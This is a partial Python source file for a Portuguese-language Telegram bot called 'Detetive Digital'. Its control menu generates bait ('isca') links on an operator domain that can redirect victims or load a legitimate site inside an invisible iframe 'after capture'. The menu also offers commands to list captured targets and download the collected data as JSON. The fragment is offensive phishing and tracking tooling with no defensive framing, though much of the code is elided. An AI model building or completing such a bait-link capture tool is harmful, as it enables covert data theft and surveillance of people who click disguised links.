        ...
        try:
            ...
            for result in data.get("result", []):
                ...
                if text in ["/start", "/menu"]:
                    menu_texto = (
                        "🎛️ *Painel de Controle - Detetive Digital*\n\n"
                        "Escolha uma opção abaixo:"
                    )
                    enviar_mensagem_telegram(chat_id, menu_texto + "\n\n1️⃣ Envie `/link` para gerar o link padrão.\n2️⃣ Envie `/link https://site.com` para redirecionamento.\n3️⃣ Envie `/iframe https://site-legitimo.com` para usar iframes invisíveis.\n4️⃣ Envie `/logs` para ver os alvos.\n5️⃣ Envie `/bloco` para baixar o JSON.")
                
                elif text.startswith("/link"):
                    partes = text.split(" ", 1)
                    dominio_base = "https://seu-dominio.com"
                    
                    if len(partes) > 1 and partes[1].startswith("http"):
                        url_alvo = partes[1]
                        link_customizado = f"{dominio_base}/isca/verificacao?to={urllib.parse.quote(url_alvo)}"
                        link_msg = f"🔗 *Link de isca personalizado (Redirecionamento):*\n`{link_customizado}`"
                    else:
                        link_msg = f"🔗 *Seu link de isca padrão gerado:*\n`{dominio_base}/isca/verificacao`"
                    ...
                    if len(partes) > 1 and partes[1].startswith("http"):
                        ...
                        link_msg = f"🪞 *Link com Iframe Invisível (Carrega site legítimo após captura):*\n`{link_customizado}`"
                    else:
